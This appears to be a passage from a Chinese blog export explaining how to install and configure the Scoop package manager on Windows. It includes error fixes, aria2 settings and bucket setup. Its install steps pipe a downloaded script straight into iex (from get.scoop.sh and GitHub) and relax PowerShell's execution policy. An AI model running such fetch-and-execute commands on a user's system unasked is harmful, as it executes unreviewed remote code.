**“基础连接已经关闭：发送时发生错误“** 或 **“操作超时”** ；原因可能是 https://get.scoop.sh 无法访问，或者网络不稳定或者和谐，用以下命令再下载，还是不行的话可多试几次、更换网络或者用梯子\n\n```powershell\niex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/lukesampson/scoop/master/bin/install.ps1')\n```\n\n4. 未能创建 SSL/TLS 安全通道\n\n```powershell\niex : 使用“2”个参数调用“DownloadFile”是发生异常:“请求被中止: 未能创建 SSL/TLS 安全通道。”\n所在位置 行:1 字符: 1\n+ iex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [Invoke-Expression], MethodInvocationException\n    + FullyQualifiedErrorId : WebException, Microsoft.PowreShell.Commands.InvokeExpressionCommand\n```\n\n执行以下命令：\n\n```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n```\n\n# 安装成功\n\n输入 `scoop help` 验证是否安装成功。\n\n```powershell\nUsage: scoop <command> [<args>]\n\nSome useful commands are:\n\nalias       Manage scoop aliases\nbucket      Manage Scoop buckets\ncache       Show or clear the download cache\ncheckup     Check for potential problems\ncleanup     Cleanup apps by removing old versions\nconfig      Get or set configuration values\ncreate      Create a custom app manifest\ndepends     List dependencies for an app\nexport      Exports (an importable) list of installed apps\nhelp        Show help for a command\nhome        Opens the app homepage\ninfo        Display information about an app\ninstall     Install apps\nlist        List installed apps\nprefix      Returns the path to the specified app\nreset       Reset an app to resolve conflicts\nsearch      Search available apps\nstatus      Show status and check for new app versions\nuninstall   Uninstall an app\nupdate      Update apps, or Scoop itself\nvirustotal  Look for app's hash on virustotal.com\nwhich       Locate a shim/executable (similar to 'which' on Linux)\n\nType 'scoop help <command>' to get help for a specific command.\n```\n\n常用命令：\n\n```powershell\n# 查找软件\nscoop search apps\n# 下载软件\nscoop install apps\n# 卸载软件\nscoop uninstall apps\n```\n\n# 提升下载速度\n\nscoop 下载软件大多是从外部链接下载的，网速较慢且容易失败，可以安装 aria2 来提升下载速度：\n\n```powershell\nscoop install aria2\n```\n\naria2 安装成功后再下载其他软件时会自动调用进行多线程下载，所以推荐先安装这个软件提升下载体验。\n\n可以设置下载下载线程数（默认为 16 线程）\n\n```powershell\nscoop config aria2-max-connection-per-server 16\nscoop config aria2-split 16\nscoop config aria2-min-split-size 1M\n```\n\n# 添加仓库\n\nscoop 自带的 main bucket 软件过少，我们需要添加官方维护的 extras bucket：\n\n```powershell\nscoop bucket add extras\n```\n\n也可以添加其他的第三方 bucket:\n\n```powershell\nscoop bucket add bucketname bucketaddress\n```\n\n例如添加 scoopbucket 并安装 cajviewer：\n\n```powershell\n# add scoopbucket\nscoop bucket add scoopbucket https://github.com/yuanying1199/scoopbucket\n# install cajviewer\nscoop install scoopbucket/cajviewerlite\n```\n\n# 参考文章\n\n[Scoop 安装详解](https://boyinthesun.cn/post/scoop/)\n\n[scoop——强大的 Windows 命令行包管理工具](https://www.jianshu.com/p/50993df76b1c)\n","slug":"2021/08/Windows安装Scoop","published":1,"updated":"2022-09-26T15:03:25.700Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj20019zge39i0t81ou","content":"<p>Scoop 是可用于 windows 的一款包管理工具，可以下载程序并自动配置环境变量等，记录一下安装方法。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"安装条件\"><a href=\"#安装条件\" class=\"headerlink\" title=\"安装条件\"></a>安装条件</h1><ul>\n<li>用户名不含中文字符</li>\n<li>Windows 7 SP1+ &#x2F; Windows Server 2008+</li>\n<li>PowerShell 3+</li>\n<li>.NET Framework 4.5+</li>\n</ul>\n<p>可在 PowerShell 运行以下代码获取版本信息：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看Powershell版本</span></span><br><span class=\"line\"><span class=\"variable\">$PSVersionTable</span>.PSVersion.Major</span><br><span class=\"line\"><span class=\"comment\">#查看.NET Framework版本</span></span><br><span class=\"line\"><span class=\"variable\">$PSVersionTable</span>.CLRVersion.Major</span><br></pre></td></tr></table></figure>\n\n<p>先输入以下代码，保证后面的脚本有运行权限：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set-executionpolicy</span> remotesigned <span class=\"literal\">-scope</span> currentuser</span><br><span class=\"line\"></span><br><span class=\"line\">执行策略更改</span><br><span class=\"line\">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class=\"number\">135170</span></span><br><span class=\"line\">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class=\"line\">[<span class=\"type\">Y</span>] 是(Y)  [<span class=\"type\">A</span>] 全是(A)  [<span class=\"type\">N</span>] 否(N)  [<span class=\"type\">L</span>] 全否(L)  [<span class=\"type\">S</span>] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h1><p>在 PowerShell 输入以下代码下载 Scoop：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iwr</span> <span class=\"literal\">-useb</span> get.scoop.sh | <span class=\"built_in\">iex</span></span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\"><span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"下载出现错误\"><a href=\"#下载出现错误\" class=\"headerlink\" title=\"下载出现错误\"></a>下载出现错误</h2><ol>\n<li><p>若下载中断，重新下载之前请先删除 <code>C:\\Users\\username\\scoop</code> 文件夹。</p>\n</li>\n<li><p>需要安全策略错误，如下所示</p>\n</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PowerShell requires an execution policy <span class=\"keyword\">in</span> [<span class=\"type\">Unrestricted</span>, <span class=\"type\">RemoteSigned</span>, <span class=\"type\">ByPass</span>] to run Scoop.</span><br><span class=\"line\"><span class=\"keyword\">For</span> example, to <span class=\"built_in\">set</span> the execution policy to <span class=\"string\">&#x27;RemoteSigned&#x27;</span> please run :</span><br><span class=\"line\"><span class=\"string\">&#x27;Set-ExecutionPolicy RemoteSigned -scope CurrentUser&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>修改 PowerShell 的安全策略：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set-ExecutionPolicy</span> RemoteSigned <span class=\"literal\">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>无法连接到远程服务器</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用“<span class=\"number\">1</span>”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”</span><br><span class=\"line\">所在位置 行:<span class=\"number\">1</span> 字符: <span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class=\"line\">    + FullyQualifiedErrorId : WebException</span><br></pre></td></tr></table></figure>\n\n<p>这个错误还有可能出现的 <strong>“基础连接已经关闭：发送时发生错误“</strong> 或 <strong>“操作超时”</strong> ；原因可能是 <a href=\"https://get.scoop.sh/\">https://get.scoop.sh</a> 无法访问，或者网络不稳定或者和谐，用以下命令再下载，还是不行的话可多试几次、更换网络或者用梯子</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://raw.githubusercontent.com/lukesampson/scoop/master/bin/install.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>未能创建 SSL&#x2F;TLS 安全通道</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iex</span> : 使用“<span class=\"number\">2</span>”个参数调用“DownloadFile”是发生异常:“请求被中止: 未能创建 SSL/TLS 安全通道。”</span><br><span class=\"line\">所在位置 行:<span class=\"number\">1</span> 字符: <span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : NotSpecified: (:) [<span class=\"built_in\">Invoke-Expression</span>], MethodInvocationException</span><br><span class=\"line\">    + FullyQualifiedErrorId : WebException, Microsoft.PowreShell.Commands.InvokeExpressionCommand</span><br></pre></td></tr></table></figure>\n\n<p>执行以下命令：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Net.ServicePointManager</span>]::SecurityProtocol = [<span class=\"type\">Net.SecurityProtocolType</span>]::Tls12</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"安装成功\"><a href=\"#安装成功\" class=\"headerlink\" title=\"安装成功\"></a>安装成功</h1><p>输入 <code>scoop help</code> 验证是否安装成功。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Usage: scoop &lt;command&gt; [&lt;<span class=\"type\">args</span>&gt;]</span><br><span class=\"line\"></span><br><span class=\"line\">Some useful commands are:</span><br><span class=\"line\"></span><br><span class=\"line\">alias       Manage scoop aliases</span><br><span class=\"line\">bucket      Manage Scoop buckets</span><br><span class=\"line\">cache       Show or <span class=\"built_in\">clear</span> the download cache</span><br><span class=\"line\">checkup     Check <span class=\"keyword\">for</span> potential problems</span><br><span class=\"line\">cleanup     Cleanup apps by removing old versions</span><br><span class=\"line\">config      Get or <span class=\"built_in\">set</span> configuration values</span><br><span class=\"line\">create      Create a custom app manifest</span><br><span class=\"line\">depends     List dependencies <span class=\"keyword\">for</span> an app</span><br><span class=\"line\">export      Exports (an importable) list of installed apps</span><br><span class=\"line\">help        Show help <span class=\"keyword\">for</span> a command</span><br><span class=\"line\">home        Opens the app homepage</span><br><span class=\"line\">info        Display information about an app</span><br><span class=\"line\">install     Install apps</span><br><span class=\"line\">list        List installed apps</span><br><span class=\"line\">prefix      Returns the path to the specified app</span><br><span class=\"line\">reset       Reset an app to resolve conflicts</span><br><span class=\"line\">search      Search available apps</span><br><span class=\"line\">status      Show status and check <span class=\"keyword\">for</span> new app versions</span><br><span class=\"line\">uninstall   Uninstall an app</span><br><span class=\"line\">update      Update apps, or Scoop itself</span><br><span class=\"line\">virustotal  Look <span class=\"keyword\">for</span> app<span class=\"string\">&#x27;s hash on virustotal.com</span></span><br><span class=\"line\"><span class=\"string\">which       Locate a shim/executable (similar to &#x27;</span>which<span class=\"string\">&#x27; on Linux)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Type &#x27;</span>scoop help &lt;command&gt;<span class=\"string\">&#x27; to get help for a specific command.</span></span><br></pre></td></tr></table></figure>\n\n<p>常用命令：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查找软件</span></span><br><span class=\"line\">scoop search apps</span><br><span class=\"line\"><span class=\"comment\"># 下载软件</span></span><br><span class=\"line\">scoop install apps</span><br><span class=\"line\"><span class=\"comment\"># 卸载软件</span></span><br><span class=\"line\">scoop uninstall apps</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提升下载速度\"><a href=\"#提升下载速度\" class=\"headerlink\" title=\"提升下载速度\"></a>提升下载速度</h1><p>scoop 下载软件大多是从外部链接下载的，网速较慢且容易失败，可以安装 aria2 来提升下载速度：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop install aria2</span><br></pre></td></tr></table></figure>\n\n<p>aria2 安装成功后再下载其他软件时会自动调用进行多线程下载，所以推荐先安装这个软件提升下载体验。</p>\n<p>可以设置下载下载线程数（默认为 16 线程）</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop config aria2<span class=\"literal\">-max-connection-per-server</span> <span class=\"number\">16</span></span><br><span class=\"line\">scoop config aria2<span class=\"operator\">-split</span> <span class=\"number\">16</span></span><br><span class=\"line\">scoop config aria2<span class=\"literal\">-min-split-size</span> <span class=\"number\">1</span>M</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"添加仓库\"><a href=\"#添加仓库\" class=\"headerlink\" title=\"添加仓库\"></a>添加仓库</h1><p>scoop 自带的 main bucket 软件过少，我们需要添加官方维护的 extras bucket：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop bucket add extras</span><br></pre></td></tr></table></figure>\n\n<p>也可以添加其他的第三方 bucket:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop bucket add bucketname bucketaddress</span><br></pre></td></tr></table></figure>\n\n<p>例如添加 scoopbucket 并安装 cajviewer：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># add scoopbucket</span></span><br><span class=\"line\">scoop bucket add scoopbucket https://github.com/yuanying1199/scoopbucket</span><br><span class=\"line\"><span class=\"comment\"># install cajviewer</span></span><br><span class=\"line\">scoop install scoopbucket/cajviewerlite</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://boyinthesun.cn/post/scoop/\">Scoop 安装详解</a></p>\n<p><a href=\"https://www.jianshu.com/p/50993df76b1c\">scoop——强大的 Windows 命令行包管理工具</a></p>\n","site":{"data":{}},"excerpt":"<p>Scoop 是可用于 windows 的一款包管理工具，可以下载程序并自动配置环境变量等，记录一下安装方法。</p>","more":"<h1 id=\"安装条件\"><a href=\"#安装条件\" class=\"headerlink\" title=\"安装条件\"></a>安装条件</h1><ul>\n<li>用户名不含中文字符</li>\n<li>Windows 7 SP1+ &#x2F; Windows Server 2008+</li>\n<li>PowerShell 3+</li>\n<li>.NET Framework 4.5+</li>\n</ul>\n<p>可在 PowerShell 运行以下代码获取版本信息：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查看Powershell版本</span></span><br><span class=\"line\"><span class=\"variable\">$PSVersionTable</span>.PSVersion.Major</span><br><span class=\"line\"><span class=\"comment\">#查看.NET Framework版本</span></span><br><span class=\"line\"><span class=\"variable\">$PSVersionTable</span>.CLRVersion.Major</span><br></pre></td></tr></table></figure>\n\n<p>先输入以下代码，保证后面的脚本有运行权限：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set-executionpolicy</span> remotesigned <span class=\"literal\">-scope</span> currentuser</span><br><span class=\"line\"></span><br><span class=\"line\">执行策略更改</span><br><span class=\"line\">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class=\"number\">135170</span></span><br><span class=\"line\">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class=\"line\">[<span class=\"type\">Y</span>] 是(Y)  [<span class=\"type\">A</span>] 全是(A)  [<span class=\"type\">N</span>] 否(N)  [<span class=\"type\">L</span>] 全否(L)  [<span class=\"type\">S</span>] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h1><p>在 PowerShell 输入以下代码下载 Scoop：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iwr</span> <span class=\"literal\">-useb</span> get.scoop.sh | <span class=\"built_in\">iex</span></span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\"><span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"下载出现错误\"><a href=\"#下载出现错误\" class=\"headerlink\" title=\"下载出现错误\"></a>下载出现错误</h2><ol>\n<li><p>若下载中断，重新下载之前请先删除 <code>C:\\Users\\username\\scoop</code> 文件夹。</p>\n</li>\n<li><p>需要安全策略错误，如下所示</p>\n</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PowerShell requires an execution policy <span class=\"keyword\">in</span> [<span class=\"type\">Unrestricted</span>, <span class=\"type\">RemoteSigned</span>, <span class=\"type\">ByPass</span>] to run Scoop.</span><br><span class=\"line\"><span class=\"keyword\">For</span> example, to <span class=\"built_in\">set</span> the execution policy to <span class=\"string\">&#x27;RemoteSigned&#x27;</span> please run :</span><br><span class=\"line\"><span class=\"string\">&#x27;Set-ExecutionPolicy RemoteSigned -scope CurrentUser&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>修改 PowerShell 的安全策略：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Set-ExecutionPolicy</span> RemoteSigned <span class=\"literal\">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>无法连接到远程服务器</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用“<span class=\"number\">1</span>”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”</span><br><span class=\"line\">所在位置 行:<span class=\"number\">1</span> 字符: <span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class=\"line\">    + FullyQualifiedErrorId : WebException</span><br></pre></td></tr></table></figure>\n\n<p>这个错误还有可能出现的 <strong>“基础连接已经关闭：发送时发生错误“</strong> 或 <strong>“操作超时”</strong> ；原因可能是 <a href=\"https://get.scoop.sh/\">https://get.scoop.sh</a> 无法访问，或者网络不稳定或者和谐，用以下命令再下载，还是不行的话可多试几次、更换网络或者用梯子</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://raw.githubusercontent.com/lukesampson/scoop/master/bin/install.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>未能创建 SSL&#x2F;TLS 安全通道</li>\n</ol>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">iex</span> : 使用“<span class=\"number\">2</span>”个参数调用“DownloadFile”是发生异常:“请求被中止: 未能创建 SSL/TLS 安全通道。”</span><br><span class=\"line\">所在位置 行:<span class=\"number\">1</span> 字符: <span class=\"number\">1</span></span><br><span class=\"line\">+ <span class=\"built_in\">iex</span> (<span class=\"built_in\">new-object</span> net.webclient).downloadstring(<span class=\"string\">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : NotSpecified: (:) [<span class=\"built_in\">Invoke-Expression</span>], MethodInvocationException</span><br><span class=\"line\">    + FullyQualifiedErrorId : WebException, Microsoft.PowreShell.Commands.InvokeExpressionCommand</span><br></pre></td></tr></table></figure>\n\n<p>执行以下命令：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Net.ServicePointManager</span>]::SecurityProtocol = [<span class=\"type\">Net.SecurityProtocolType</span>]::Tls12</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"安装成功\"><a href=\"#安装成功\" class=\"headerlink\" title=\"安装成功\"></a>安装成功</h1><p>输入 <code>scoop help</code> 验证是否安装成功。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Usage: scoop &lt;command&gt; [&lt;<span class=\"type\">args</span>&gt;]</span><br><span class=\"line\"></span><br><span class=\"line\">Some useful commands are:</span><br><span class=\"line\"></span><br><span class=\"line\">alias       Manage scoop aliases</span><br><span class=\"line\">bucket      Manage Scoop buckets</span><br><span class=\"line\">cache       Show or <span class=\"built_in\">clear</span> the download cache</span><br><span class=\"line\">checkup     Check <span class=\"keyword\">for</span> potential problems</span><br><span class=\"line\">cleanup     Cleanup apps by removing old versions</span><br><span class=\"line\">config      Get or <span class=\"built_in\">set</span> configuration values</span><br><span class=\"line\">create      Create a custom app manifest</span><br><span class=\"line\">depends     List dependencies <span class=\"keyword\">for</span> an app</span><br><span class=\"line\">export      Exports (an importable) list of installed apps</span><br><span class=\"line\">help        Show help <span class=\"keyword\">for</span> a command</span><br><span class=\"line\">home        Opens the app homepage</span><br><span class=\"line\">info        Display information about an app</span><br><span class=\"line\">install     Install apps</span><br><span class=\"line\">list        List installed apps</span><br><span class=\"line\">prefix      Returns the path to the specified app</span><br><span class=\"line\">reset       Reset an app to resolve conflicts</span><br><span class=\"line\">search      Search available apps</span><br><span class=\"line\">status      Show status and check <span class=\"keyword\">for</span> new app versions</span><br><span class=\"line\">uninstall   Uninstall an app</span><br><span class=\"line\">update      Update apps, or Scoop itself</span><br><span class=\"line\">virustotal  Look <span class=\"keyword\">for</span> app<span class=\"string\">&#x27;s hash on virustotal.com</span></span><br><span class=\"line\"><span class=\"string\">which       Locate a shim/executable (similar to &#x27;</span>which<span class=\"string\">&#x27; on Linux)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Type &#x27;</span>scoop help &lt;command&gt;<span class=\"string\">&#x27; to get help for a specific command.</span></span><br></pre></td></tr></table></figure>\n\n<p>常用命令：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查找软件</span></span><br><span class=\"line\">scoop search apps</span><br><span class=\"line\"><span class=\"comment\"># 下载软件</span></span><br><span class=\"line\">scoop install apps</span><br><span class=\"line\"><span class=\"comment\"># 卸载软件</span></span><br><span class=\"line\">scoop uninstall apps</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提升下载速度\"><a href=\"#提升下载速度\" class=\"headerlink\" title=\"提升下载速度\"></a>提升下载速度</h1><p>scoop 下载软件大多是从外部链接下载的，网速较慢且容易失败，可以安装 aria2 来提升下载速度：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop install aria2</span><br></pre></td></tr></table></figure>\n\n<p>aria2 安装成功后再下载其他软件时会自动调用进行多线程下载，所以推荐先安装这个软件提升下载体验。</p>\n<p>可以设置下载下载线程数（默认为 16 线程）</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop config aria2<span class=\"literal\">-max-connection-per-server</span> <span class=\"number\">16</span></span><br><span class=\"line\">scoop config aria2<span class=\"operator\">-split</span> <span class=\"number\">16</span></span><br><span class=\"line\">scoop config aria2<span class=\"literal\">-min-split-size</span> <span class=\"number\">1</span>M</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"添加仓库\"><a 